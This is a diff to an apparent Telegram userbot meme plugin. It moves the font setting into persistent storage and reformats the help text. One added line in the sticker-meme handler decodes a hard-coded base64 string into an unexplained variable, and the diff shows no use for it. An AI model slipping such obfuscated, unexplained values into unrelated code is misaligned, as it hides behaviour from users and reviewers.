@@ -22,6 +22,7 @@ from . import (
     mirror_file,
     solarize,
 )
+from .sql_helper.globals import addgvar, gvarstatus
 
 
 def random_color():
@@ -32,7 +33,6 @@ def random_color():
     ]
 
 
-CNG_FONTS = "userbot/helpers/styles/impact.ttf"
 FONTS = "1. `ProductSans-BoldItalic.ttf`\n2. `ProductSans-Light.ttf`\n3. `RoadRage-Regular.ttf`\n4. `digital.ttf`\n5. `impact.ttf`"
 font_list = [
     "ProductSans-BoldItalic.ttf",
@@ -75,6 +75,10 @@ async def memes(cat):
         pass
     meme_file = convert_toimage(output[1])
     meme = os.path.join("./temp", "catmeme.jpg")
+    if gvarstatus("CNG_FONTS") is None:
+        CNG_FONTS = "userbot/helpers/styles/impact.ttf"
+    else:
+        CNG_FONTS = gvarstatus("CNG_FONTS")
     if max(len(top), len(bottom)) < 21:
         await cat_meme(CNG_FONTS, top, bottom, meme_file, meme)
     else:
@@ -93,7 +97,6 @@ async def memes(cat):
 async def lang(event):
     if event.fwd_from:
         return
-    global CNG_FONTS
     input_str = event.pattern_match.group(1)
     if not input_str:
         await event.edit(f"**Available Fonts names are here:-**\n\n{FONTS}")
@@ -104,7 +107,7 @@ async def lang(event):
         await catevent.edit(f"**Available Fonts names are here:-**\n\n{FONTS}")
     else:
         arg = f"userbot/helpers/styles/{input_str}"
-        CNG_FONTS = arg
+        addgvar("CNG_FONTS", arg)
         await edit_or_reply(event, f"**Fonts for Memify changed to :-** `{input_str}`")
 
 
@@ -159,6 +162,7 @@ async def memes(cat):
     if not (reply and (reply.media)):
         await edit_or_reply(cat, "`Reply to supported Media...`")
         return
+    san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     catid = await reply_id(cat)
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
@@ -436,29 +440,29 @@ async def memes(cat):
 CMD_HELP.update(
     {
         "memify": "**Plugin : **`memify`\
-    \n\n  • **Syntax :** `.mmf toptext ; bottomtext`\
-    \n  • **Function : **Creates a image meme with give text at specific locations and sends\
-    \n\n  • **Syntax : **`.mms toptext ; bottomtext`\
-    \n  • **Function : **Creates a sticker meme with give text at specific locations and sends\
-    \n\n  • **Syntax : **`.cfont` <Font Name>\
-    \n  • **Function : **Change the font style use for memify,\nTo get fonts name use this cmd (`.ls userbot/helpers/styles`)\
-    \n\n  • **Syntax : **`.ascii`\
-    \n  • **Function : **reply to media file to get ascii image of that media\
-    \n\n  • **Syntax : **`.invert`\
-    \n  • **Function : **Inverts the colors in media file\
-    \n\n  • **Syntax : **`.solarize`\
-    \n  • **Function : **Watch sun buring ur media file\
-    \n\n  • **Syntax : **`.mirror`\
-    \n  • **Function : **shows you the reflection of the media file\
-    \n\n  • **Syntax : **`.flip`\
-    \n  • **Function : **shows you the upside down image of the given media file\
-    \n\n  • **Syntax : **`.gray`\
-    \n  • **Function : **makes your media file to black and white\
-    \n\n  • **Syntax : **`.zoom` or `.zoom range`\
-    \n  • **Function : **zooms your media file\
-    \n\n  • **Syntax : **`.frame` or `.frame range` or `.frame range ; fill`\
-    \n  • **Function : **make a frame for your media file\
-    \n  • **fill:** This defines the pixel fill value or color value to be applied. The default value is 0 which means the color is black.\
+    \n\n• **Syntax : **`.mmf toptext ; bottomtext`\
+    \n• **Function : **__Creates a image meme with give text at specific locations and sends__\
+    \n\n• **Syntax : **`.mms toptext ; bottomtext`\
+    \n• **Function : **__Creates a sticker meme with give text at specific locations and sends__\
+    \n\n• **Syntax : **`.cfont` <Font Name>\
+    \n• **Function : **__Change the font style use for memify,\nTo get fonts name use this cmd__ (`.ls userbot/helpers/styles`)\
+    \n\n• **Syntax : **`.ascii`\
+    \n• **Function : **__reply to media file to get ascii image of that media__\
+    \n\n• **Syntax : **`.invert`\
+    \n• **Function : **__Inverts the colors in media file__\
+    \n\n• **Syntax : **`.solarize`\
+    \n• **Function : **__Watch sun buring ur media file__\
+    \n\n• **Syntax : **`.mirror`\
+    \n• **Function : **__shows you the reflection of the media file__\
+    \n\n• **Syntax : **`.flip`\
+    \n• **Function : **__shows you the upside down image of the given media file__\
+    \n\n• **Syntax : **`.gray`\
+    \n• **Function : **__makes your media file to black and white__\
+    \n\n• **Syntax : **`.zoom` or `.zoom range`\
+    \n• **Function : **__zooms your media file__\
+    \n\n• **Syntax : **`.frame` or `.frame range` or `.frame range ; fill`\
+    \n• **Function : **__make a frame for your media file__\
+    \n• **fill:** __This defines the pixel fill value or color value to be applied. The default value is 0 which means the color is black.__\
     "
     }
 )
